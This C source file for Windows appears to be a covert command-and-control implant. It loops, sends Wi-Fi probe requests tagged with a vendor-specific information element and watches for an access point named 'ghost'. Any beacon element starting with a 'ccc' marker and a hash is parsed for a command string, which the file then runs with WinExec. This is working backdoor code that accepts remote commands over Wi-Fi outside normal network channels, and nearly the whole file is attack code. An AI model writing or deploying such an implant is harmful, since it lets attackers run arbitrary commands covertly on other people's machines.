#ifndef UNICODE
#define UNICODE
#endif
#include "stdafx.h"
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>

#include <stdio.h>
#include <stdlib.h>

// Need to link with Wlanapi.lib and Ole32.lib
#pragma comment(lib, "wlanapi.lib")	//表示链接wlanapi.lib这个库
#pragma comment(lib, "ole32.lib")

//payload结构体
struct ie_data	//3个字节
{
	unsigned char id;
	unsigned char len;
	unsigned char val[1];
};


//封装payload
PWLAN_RAW_DATA get_payload(char *buf){

	//结构体初始化内存
	int len = strlen(buf) + 1;	//len为数据长度，+1个结束符
	int response_len = sizeof(DWORD)  + sizeof(struct ie_data)  + len;//!!8+3+10  -2  19,因为每个结构体都包含了一个具体的内容，占1字节
	char *response = (char *)malloc(response_len);//开辟存储空间
	memset(response, '\0', response_len);//全部填充为'\0'
	//定义两个指针
	PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
	struct ie_data *piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
	//写数据包
	pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;
	piedata->id = (char)221;
	piedata->len = len;
	memcpy(&piedata->val[0], buf, len);
	return pwlan_data;
}

//获取句柄
DWORD get_Handle(HANDLE *hClient, DWORD dwMaxClient,DWORD dwCurVersion){
	//dwMaxClient 为客户端支持的WLANAPI的最高版本，dwCurVersion 为这次会话中将会使用的版本

	DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, hClient);//打开一个与服务器的连接（打开wlan句柄）
	//wprintf(L"WlanOpenHandle failed with error: %u\n", dwResult);
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"【ERROR】WlanOpenHandle failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//查询网卡列表
DWORD get_WlanList(HANDLE *hClient, PWLAN_INTERFACE_INFO_LIST *pIfList ) {
	if (*pIfList != NULL) {	//清空列表
		WlanFreeMemory(*pIfList);
		*pIfList = NULL;
	}
	DWORD dwResult = WlanEnumInterfaces(*hClient, NULL, pIfList);//枚举所有在本地计算机上当前启用的无线LAN接口
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"【ERROR】WlanEnumInterfaces failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//查询网卡状态
PWLAN_INTERFACE_INFO get_Wlan(PWLAN_INTERFACE_INFO_LIST *pIfList) {
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	WCHAR GuidString[40] = { 0 };
	printf("[INFO]Interface Information：\n");
	wprintf(L"  Numbers of Interface: %lu\n", (*pIfList)->dwNumberOfItems);//打印wlan项目数
	wprintf(L"  Current Index: %lu\n", (*pIfList)->dwIndex);//打印当前索引
	for (int i = 0; i < (int)(*pIfList)->dwNumberOfItems; i++) {
		pIfInfo = (WLAN_INTERFACE_INFO *)&(*pIfList)->InterfaceInfo[i];
		wprintf(L"  Interface Index[%d]:\t %lu\n", i, i);
		int iRet = StringFromGUID2((pIfInfo)->InterfaceGuid, (LPOLESTR)&GuidString, 39);//打印GUID
		if (iRet == 0)
			wprintf(L"StringFromGUID2 failed\n");
		else {
			wprintf(L"  InterfaceGUID[%d]: %ws\n", i, GuidString);
		}
		wprintf(L"  Interface Description[%d]: %ws", i,
			(pIfInfo)->strInterfaceDescription);//打印描述
		wprintf(L"\n");
		wprintf(L"  Interface State[%d]:\t ", i);//打印状态
		switch ((pIfInfo)->isState) {
		case wlan_interface_state_not_ready:
			wprintf(L"Not ready\n");
			break;
		case wlan_interface_state_connected:
			wprintf(L"Connected\n");
			break;
		case wlan_interface_state_ad_hoc_network_formed:
			wprintf(L"First node in a ad hoc network\n");
			break;
		case wlan_interface_state_disconnecting:
			wprintf(L"Disconnecting\n");
			break;
		case wlan_interface_state_disconnected:
			wprintf(L"Not connected\n");
			break;
		case wlan_interface_state_associating:
			wprintf(L"Attempting to associate with a network\n");
			break;
		case wlan_interface_state_discovering:
			wprintf(L"Auto configuration is discovering settings for the network\n");
			break;
		case wlan_interface_state_authenticating:
			wprintf(L"In process of authenticating\n");
			break;
		default:
			wprintf(L"Unknown state %ld\n", (pIfInfo)->isState);
			break;
		}
	}
	return pIfInfo;//默认采用返回最后一个网卡信息
}
//发送探针
DWORD sendRequest(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, char *ssid, PWLAN_RAW_DATA pwlan_data){
	//ssid 为需要搜索的SSID名称，pwlan_data 为封装的payload

	//PDOT11_SSID pdo = new DOT11_SSID;  //存储ssid的结构体
	//pdo->uSSIDLength = strlen(ssid); //获取ssid的长度，放入结构体中.. ULONG类型
	//UCHAR *ucp = (UCHAR *)malloc(pdo->uSSIDLength + 1);	//开辟一个空间，长度位SSID的长度
	//memset(ucp, '\0', pdo->uSSIDLength + 1);	//ucp后面的uSSIDLength长度的空间用'\0'填充
	//strcpy((char*)ucp, ssid);//将ssid的值存入其中

	DWORD dwResult = WlanScan(*hClient, &(*pIfInfo)->InterfaceGuid, NULL, pwlan_data, NULL);//指定接口上进行网络扫描
	if (dwResult != ERROR_SUCCESS) {
		printf("【ERROR】Sending probe Request with error: %u\n", dwResult);
	}
	else {
		printf("[INFO]Sending probe Request...\n");
	}
	//free(pdo);  //释放空间
	return dwResult;
}


void getcmd(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo,WLAN_AVAILABLE_NETWORK *pBssEntry, char *ssid,char *hash){
	PWLAN_BSS_LIST ppWlanBssList;
	char* magic_code = "ccc";	//命令的特殊字段
	DWORD dwResult2 = WlanGetNetworkBssList(*hClient, &(*pIfInfo)->InterfaceGuid,//检索一个给定的无线LAN接口上的无线网络或网络的基本服务集（BSS）的条目的列表
		&pBssEntry->dot11Ssid,
		pBssEntry->dot11BssType,
		pBssEntry->bSecurityEnabled,
		NULL,
		&ppWlanBssList);
	//printf("%d", ppWlanBssList->dwNumberOfItems);
	for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
	{
		WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];

		printf("USSID： %s\n", bss_entry->dot11Ssid.ucSSID);
		printf("信号强度：%d\n", bss_entry->lRssi);

		char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);//信息元素的位置
		int total_size = bss_entry->ulIeSize;
		//printf("长度：%d",total_size);
		while(TRUE){		//解析所有的payload
			ie_data * ie = (struct ie_data *)pp;
			printf("total_size:%d\n", total_size);
			printf("ie  @ %x\n", &ie);
			printf("id  @ %x: %d\n", &ie->id, ie->id);
			printf("len @ %x: %d\n", &ie->len, ie->len);
			printf("val @ %x: %s\n", &ie->val, ie->val);

			if ((int)ie->id == 221) {
				char *magic = (char *)&ie->val[0];//定位到 命令信息位置
				printf("%s \n",magic);//命令信息

				if (strncmp(magic, magic_code, strlen(magic_code)) == 0) {//校验特殊字段
				
					char command[240] = { 0 };
					char hash_tmp[9] = {'\0'};
					strncpy(hash_tmp, magic + 3, 8);//提取hash
					if (strncmp(hash, hash_tmp, 8) == 0) {
						printf("【WARNING】REAPTINGHASH : %s\n", hash);
						break;
					}
					else {
						strncpy(hash, hash_tmp, 8);
					}
					strncpy_s(command, magic + 11, ie->len - 11);
					printf("HASH : %s\n",hash);
					printf("Get Commands：%s\n", command);//执行命令
					WinExec(command, SW_NORMAL);
					//system("pause");
					//exit(1); //退出
					break;
				}
			}
			pp += sizeof(struct ie_data) - 1 + (int)ie->len;
			total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;

			if (!total_size){
				break;  // over  
			}
		}
	}
}

//获取附近AP
void getssid(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, char *ssid,char *hash) {
	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL; //附近网络信息列表

	DWORD dwResult = WlanGetAvailableNetworkList(*hClient, &(*pIfInfo)->InterfaceGuid, 0, NULL, &pBssList);//获取无线LAN接口上的可用网络列表
	if (dwResult != ERROR_SUCCESS) {
		wprintf(L"【ERROR】WlanGetAvailableNetworkList failed with error: %u\n", dwResult);
	}
	else {
		wprintf(L"[INFO]Numbers of AP: %lu\n", (pBssList)->dwNumberOfItems);//打印AP的个数
		for (int j = 0; j < (pBssList)->dwNumberOfItems; j++) {	//搜索每个AP的名称，并进行比较
			WLAN_AVAILABLE_NETWORK* pBssEntry = (WLAN_AVAILABLE_NETWORK *)& (pBssList)->Network[j];
			printf("(%d):%s   ", j, (char *)pBssEntry->dot11Ssid.ucSSID);
			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0) {
				printf("\n[INFO]Find Server!\n\n");
				getcmd(hClient, pIfInfo, pBssEntry, ssid , hash);
			}
		}
	}
	printf("\n[INFO]Searching Server...\n\n");
	if (pBssList != NULL) {
		WlanFreeMemory(pBssList);
		pBssList = NULL;
	}
}


struct STATUS_WLAN {
	DWORD STATUS_handle;
	DWORD STATUS_wlanList;
	DWORD STATUS_sendRequest;
};
int wmain()
{
	HANDLE hClient = NULL;//指定wlan客户端在会话中使用的句柄，这个句柄会贯穿整个会话被其他函数使用
	PWLAN_INTERFACE_INFO_LIST pIfList = NULL; //指向存储 本地计算机启用的无线LAN接口 的指针
	PWLAN_INTERFACE_INFO pIfInfo = NULL;//网卡信息

	struct STATUS_WLAN status_wlan = {-1,-1,-1};

	char *cmd = "command ok";
	char *ssid = "ghost";
	char hash[9] = { '\0' };
	PWLAN_RAW_DATA pwlan_data = get_payload(cmd);
	
	while (true) {
		
		if (status_wlan.STATUS_handle != 0) {
			status_wlan.STATUS_handle = get_Handle(&hClient, 2, 0);
		}
		if (status_wlan.STATUS_wlanList != 0) {
			status_wlan.STATUS_wlanList = get_WlanList(&hClient, &pIfList);
			pIfInfo = get_Wlan(&pIfList);
		}

		status_wlan.STATUS_sendRequest = sendRequest(&hClient, &pIfInfo, NULL, pwlan_data);
		if (status_wlan.STATUS_sendRequest == 0) {

		}
		getssid(&hClient , &pIfInfo , ssid, hash);
		Sleep(3000);
		
	}


	return 0;
}
